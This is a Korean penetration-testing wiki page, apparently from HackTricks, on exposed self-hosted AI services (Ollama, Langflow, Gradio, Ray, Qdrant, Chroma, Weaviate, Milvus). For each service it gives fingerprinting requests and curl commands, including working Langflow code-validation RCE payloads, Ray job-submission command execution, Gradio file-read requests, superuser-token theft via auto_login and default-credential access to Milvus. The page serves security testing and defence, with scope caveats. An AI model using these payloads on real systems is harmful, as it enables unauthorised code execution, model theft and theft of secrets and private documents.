# 노출된 자체 호스팅 AI 서비스

{{#include ../banners/hacktricks-training.md}}

AI 기능을 개발하는 팀은 자체 model runner, agent builder, 데모 UI, 컴퓨팅 클러스터, vector database를 운영하는 경우가 많습니다. 이러한 도구 중 다수는 노트북이나 폐쇄된 실험실 네트워크용으로 설계되어 **기본적으로 인증이 없거나** 인증 우회 기능이 활성화된 상태로 제공됩니다. 이런 서비스에 공격자가 접근할 수 있으면, 일반적으로 다음과 같은 영향을 초래합니다.

- GPU와 모델을 무료로 사용하고 비공개 모델을 탈취할 수 있습니다.
- 프롬프트, 문서, embedding이 유출될 수 있습니다.
- 프로세스 환경 변수에 있는 비밀정보(LLM provider 키, 클라우드 자격 증명)가 유출될 수 있습니다.
- 일부 API는 코드 실행을 **기능으로** 제공하므로 코드 실행이 가능할 수 있습니다.

이 페이지에서는 이러한 서비스를 찾는 방법과 각 API 유형에서 테스트할 항목을 설명합니다. 자체 호스팅 inference server의 보안 강화와 llama.cpp `/slots` leak에 관한 내용은 [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening)를 참고하세요. 악성 모델 파일에 관한 내용은 [AI Models RCE](AI-Models-RCE.md)를 참고하세요.

## 핑거프린팅

자격 증명 없이 다음 요청을 보냅니다. 예상 필드가 포함된 JSON 응답으로 제품을 식별할 수 있으며, 버전도 확인할 수 있는 경우 아래 검사 항목 중 무엇을 적용할지 알 수 있습니다. 포트는 문서에 명시된 기본값 또는 공식 실행 예제에서 사용하는 포트입니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| 제품 | 일반적인 포트 | 인증되지 않은 요청 | 식별 정보 |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | 버전 JSON, 로컬 모델 목록 |
| Langflow | 7860 | `GET /api/v1/version` | Langflow 버전 JSON |
| Gradio | 7860 | `GET /config` | Gradio 버전과 component ID가 포함된 앱 설정 |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, 제출된 job 목록 |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat 값, Chroma 버전 |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant 버전, collection 목록 |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate 버전, class 목록 |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection 목록 또는 인증 오류 |

이러한 서비스는 reverse proxy 뒤에서 경로 접두사(예: `/ollama/` 또는 `/ray/`)를 사용해 게시되는 경우도 많으므로, JavaScript 번들 또는 API 문서에서 찾은 접두사를 붙여 요청을 다시 보내세요.

## 인증되지 않은 inference 및 모델 관리 API

Model runner는 보통 inference 경로와 관리 경로가 함께 있는 단일 REST API를 노출합니다. Ollama가 좋은 예입니다. Ollama에는 내장 인증 기능이 없으며 기본적으로 `127.0.0.1:11434`에 바인딩됩니다. `OLLAMA_HOST`를 사용하면 바인딩 주소를 변경할 수 있습니다.<sup>[[1]](#references)[[15]](#references)</sup> 공식 Docker 이미지는 컨테이너 내에서 `OLLAMA_HOST=0.0.0.0:11434`를 설정하고 `EXPOSE 11434`를 선언하며 `USER` 지시문이 없으므로, 서버는 컨테이너에서 root로 실행됩니다.<sup>[[16]](#references)</sup> `EXPOSE`는 호스트에서 포트를 게시하지 않으므로, 호스트에서 접근 가능한지는 배포 방식에 따라 달라집니다. 문서의 `docker run` 명령은 `-p 11434:11434`를 사용하며, 호스트 IP를 지정하지 않으면 Docker는 이러한 매핑을 모든 호스트 인터페이스에 게시합니다.<sup>[[17]](#references)[[18]](#references)</sup>

각 경로 그룹을 통해 공격자가 얻을 수 있는 정보와 기능은 다음과 같습니다.<sup>[[2]](#references)</sup>

| 경로 | 인증되지 않은 경우의 영향 |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | 비공개 사용자 지정 모델을 포함한 로컬 및 로드된 모델 목록 |
| `POST /api/show` | Modelfile, template, **system prompt**를 포함한 모델 세부 정보 |
| `POST /api/generate`, `/api/chat`, `/api/embed` | 피해자 하드웨어에서 inference를 무료로 실행 |
| `POST /api/pull`, `/api/push` | 공격자가 지정한 registry에서 서버가 모델을 다운로드하거나 해당 registry로 모델을 업로드하도록 함 |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | 모델 생성, 덮어쓰기 또는 삭제 |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

인증 정보 없이 반환된 모델 목록만으로도 노출이 입증됩니다. 커스텀 모델에는 `/api/show`를 통해 확인할 수 있는 내부 system prompt가 포함된 경우가 많습니다. 여러분의 호스트를 대상으로 pull이 이루어진다면 서버가 공격자가 지정한 registry에서 manifest를 가져온다는 뜻입니다. 여러분의 registry를 대상으로 `/api/push`를 호출하면 노출이 모델 탈취로 이어집니다. 실제 대상에서는 create 또는 delete 라우트를 호출하지 마세요.

Registry pull은 서버가 원격 manifest의 값을 사용해 blob을 저장하므로 parser 공격 표면이기도 합니다. Probllama(CVE-2024-37032, Ollama 0.1.34에서 수정됨)에서는 manifest의 `digest`를 검증 없이 파일 이름으로 사용했습니다. 따라서 악성 registry는 `../` 시퀀스를 사용해 blobs 디렉터리 외부에 파일을 쓸 수 있었습니다. digest가 로컬 파일을 가리키도록 조작한 manifest를 push하면 해당 파일이 공격자의 registry로 유출됩니다. Wiz는 서버가 root로 실행되는 Docker에서 공유 라이브러리를 작성하고 이를 `/etc/ld.so.preload`에 추가한 다음, `/api/chat`을 호출해 새 프로세스가 해당 라이브러리를 로드하도록 하여 RCE를 달성했습니다.<sup>[[15]](#references)</sup> runner가 임의의 registry에서 pull할 수 있다면, manifest 필드를 경로로 변환하는 방식을 확인하세요.

## 설계상 코드를 실행하는 API

### 작업 제출 API

분산 컴퓨팅 프레임워크에서는 코드 실행이 핵심 기능입니다. 대시보드 포트(8265)의 Ray Jobs API는 `entrypoint` 셸 명령을 받아 클러스터에서 실행합니다.<sup>[[19]](#references)</sup> Oligo ShadowRay 연구에 따르면 Jobs API에는 인증이 없으며 대시보드는 `0.0.0.0`에 바인딩됩니다. Ray는 제어된 네트워크 내부에서만 실행될 것으로 기대하므로 이에 해당하는 CVE-2023-48022는 논란의 여지가 있습니다.<sup>[[20]](#references)</sup> Ray 2.52.0에서 선택적 토큰 인증(`RAY_AUTH_MODE=token`)을 추가했습니다. Ray 2.59는 `ray.init()`으로 시작한 로컬 클러스터에서 이를 기본적으로 활성화합니다. 사용 가능한 토큰이 없더라도 `ray start --head`는 인증 없이 시작될 수 있습니다. Ray는 2.61에 더 폭넓게 기본 인증을 적용할 계획을 문서화했으므로, 대시보드가 열려 있다고 가정하지 말고 배포된 버전과 시작 방식을 확인하세요.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

이러한 종류의 대시보드에는 구버전에서 점검해 볼 만한 보조 경로도 있습니다. Ray 2.8.1 이전에는 `/log_proxy?url=`이 임의의 HTTP(S) URL을 가져왔고(클라우드 메타데이터에 대한 SSRF), `/api/v0/logs/file`은 인증 없이 임의의 `filename` 경로를 허용했습니다.<sup>[[8]](#references)</sup>

### 함수 정의를 실행하는 코드 "검증" 엔드포인트

사용자 지정 Python 컴포넌트를 허용하는 에이전트 빌더 중에는 코드를 `ast`로 파싱한 뒤 함수 정의만 `exec()`로 실행해 "검증"하는 경우가 있습니다. 이는 안전하지 않습니다. Python은 함수를 정의할 때 **데코레이터와 기본 인수 값을 평가하므로**, 함수 본문이 실행되지 않아도 그곳에 넣은 코드가 실행됩니다. Langflow의 `POST /api/v1/validate/code`는 이런 방식으로 작동했으며, 1.3.0 이전에는 인증이 필요하지 않았습니다(CVE-2025-3248). 명령 출력이 포함된 예외를 발생시키면 엔드포인트가 응답에 출력을 반환합니다.<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

사용자 코드를 컴파일하거나 린트하거나 "검사"하는 모든 엔드포인트에서 이 패턴을 테스트하고, 증거로는 DNS callback을 우선 사용하세요.

### 자동 로그인 및 기본 superuser 토큰 라우트

단일 사용자 도구에는 모든 방문자를 administrator로 로그인시키는 바로 가기가 포함되는 경우가 많습니다. Langflow에서 `AUTO_LOGIN`이 활성화되어 있으면 `GET /api/v1/auto_login`은 모든 호출자에게 기본 superuser의 토큰을 반환합니다. 비활성화되어 있으면 해당 라우트는 `Auto login is disabled.`라고 응답합니다.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0~1.10.0에서는 기본적으로 활성화되어 있었습니다(CVE-2026-9103). 이를 위에서 설명한 인증된 code-validation 라우트와 연결하면 인증되지 않은 RCE가 다시 가능해집니다(CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> 현재 공식 릴리스 패키지와 Docker 이미지는 자동 로그인을 비활성화하고 superuser 비밀번호를 요구하지만, 개발 브랜치에서는 계속 활성화되어 있습니다.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

코드 실행이 불가능하더라도 superuser token이 있으면 모든 flow와 저장된 provider credentials에 접근할 수 있습니다. 자동화된 테스트에서 관련 사전 조건을 확인하는 방법은 [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md)를 참고하세요.

## ML 데모 UI의 파일 제공 및 RPC 라우트

ML 데모 프레임워크는 일반 라우트를 통해 업로드 및 생성된 파일을 제공하고, frontend에서 서버 측 컴포넌트 헬퍼를 호출할 수 있도록 합니다. Gradio는 이를 위해 `/config`, `/upload`, `/file=<path>`를 노출합니다.<sup>[[5]](#references)</sup> 비슷한 프레임워크에서 테스트할 만한 패턴은 다음 두 가지입니다.

- **업로드 하위 디렉터리에서의 traversal:** 파일 라우트가 경로가 임시 폴더 내부에서 시작하는지만 확인한다면, 파일을 업로드해 하위 디렉터리를 만든 다음 `../` 또는 `%2e%2e%2f`를 사용해 해당 디렉터리 밖으로 이동합니다. Gradio 4.0~4.10(CVE-2023-51449)은 이 방식에 취약했습니다.<sup>[[26]](#references)[[27]](#references)</sup> 클라이언트가 경로를 정규화하지 않도록 `curl --path-as-is`로 요청을 보냅니다.
- **임의 메서드 디스패치:** 사용자 입력으로 `getattr(component, fn_name)`을 호출하는 endpoint는 공격자가 내부 헬퍼를 호출할 수 있게 합니다. 4.13.0 이전 버전의 Gradio `/component_server`가 이 동작을 했습니다. 4.3~4.12에서는 `move_resource_to_block_cache`가 로컬 파일을 캐시로 복사했고, `/file=`을 통해 이를 다운로드할 수 있었습니다. 3.47~3.50.2에서는 다른 헬퍼를 이용해 파일을 읽고 전체 응답을 반환하는 SSRF를 수행할 수 있었습니다.<sup>[[26]](#references)[[28]](#references)</sup> 패치된 서버는 서버 함수로 표시되지 않은 헬퍼에 대해 `Function not found.`를 반환합니다.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

On Hugging Face Spaces에서 Space secrets는 환경 변수이므로 `/proc/self/environ`이 가장 중요한 파일입니다. Horizon3는 HTTP `Range` 헤더로 이 파일을 읽었습니다.<sup>[[26]](#references)</sup>

## Vector databases used by RAG

RAG는 원본 문서의 청크, 임베딩, 메타데이터를 vector database에 저장하고, assistant는 상위 결과를 프롬프트에 삽입합니다. 따라서 읽기 권한이 있으면 **비공개 문서의 일반 텍스트가 leak됩니다**. 쓰기 권한이 있으면 공격자가 나중에 다른 사용자의 프롬프트에 삽입될 청크를 추가할 수 있습니다. 이는 지속적인 간접 prompt injection입니다([AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection) 참고).

Self-hosted vector database의 경우 인증이 설정되어 있는지 또는 익명 액세스가 허용되어 있는지 확인하세요.

- **Qdrant**: 자체 배포된 인스턴스는 인증 없이 모든 인터페이스에서 수신 대기합니다. 설정된 경우 키는 `api-key` 헤더 또는 `Authorization: Bearer`에 입력합니다. 읽기 전용 키와 컬렉션별 키를 사용할 수 있습니다.<sup>[[11]](#references)</sup>
- **Chroma**: 기본적으로 인증이 비활성화되어 있습니다. Token auth는 `Authorization` 또는 `X-Chroma-Token`을 사용합니다.<sup>[[29]](#references)</sup>
- **Weaviate**: 익명 액세스가 활성화된 경우 자격 증명 없이 보낸 요청은 `user: anonymous`로 인증되며, 해당 사용자에게 부여된 권한을 갖습니다.<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled`가 `true`가 아니면 인증이 비활성화되어 있습니다. 인증이 활성화된 경우 기본 `root` 사용자의 비밀번호는 `Milvus`이며, 토큰 형식은 `username:password`입니다.<sup>[[31]](#references)[[14]](#references)</sup>

자격 증명 없이 비공개 데이터가 포함된 응답이 반환되면 노출된 것입니다. 인증이 활성화된 경우 변경되지 않은 기본 계정도 별도로 점검하세요.<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

페이로드에 문서 텍스트, 사용자 식별자 또는 테넌트 이름이 포함되어 있는지 확인하세요. 운영 데이터를 오염시키지 않고 쓰기 권한을 입증하려면, 범위에서 허용하는 경우에만 명확한 이름을 붙인 빈 컬렉션을 만들고 즉시 삭제하세요.

이러한 서버에서는 인증이 너무 늦게 수행될 수도 있습니다. Chroma의 Python FastAPI 서버(1.0.0부터 최소 1.5.8까지, CVE-2026-45829)에서는 컬렉션 생성 경로가 인증 확인 전에 클라이언트가 제공한 임베딩 함수를 구성했습니다. `trust_remote_code: true`인 상태에서 공격자가 제어하는 Hugging Face 모델을 참조하는 설정은 요청이 거부되더라도 공격자의 코드를 실행했습니다. Rust 프런트엔드는 영향을 받지 않았습니다.<sup>[[32]](#references)</sup> 요청에 모델 또는 플러그인 설정이 포함된 경우, 자격 증명 없이 테스트하고 모델 저장소로의 아웃바운드 요청이 발생하는지 확인하세요.

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API 문서](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow 소스 - API v1 엔드포인트](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio 소스 - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio 소스 - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray 소스 - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray 버전 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma 소스 - Python 클라이언트 기본값](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma 소스 - FastAPI 서버 경로](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - 보안](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI 사양](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI 사양](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus 서버에 연결](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama 원격 코드 실행 취약점 (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker 문서](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - 포트 게시 및 노출](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AI 워크로드를 대상으로 실제 환경에서 악용된 최초의 알려진 공격 캠페인](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray 토큰 인증](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - 어떤 속도에서도 안전하지 않음: Langflow AI에서 Python Exec를 악용한 인증 없는 RCE](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow 소스 - 로그인 라우터](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Gradio의 파일 읽기 취약점을 악용해 Hugging Face Spaces에서 비밀 정보를 탈취](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio 권고문 GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio `/component_server` 수정 커밋](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma 네이티브 인증](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - 인증](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - 사용자 액세스 인증](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - 인증 전에 제공된 ChromaToast](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
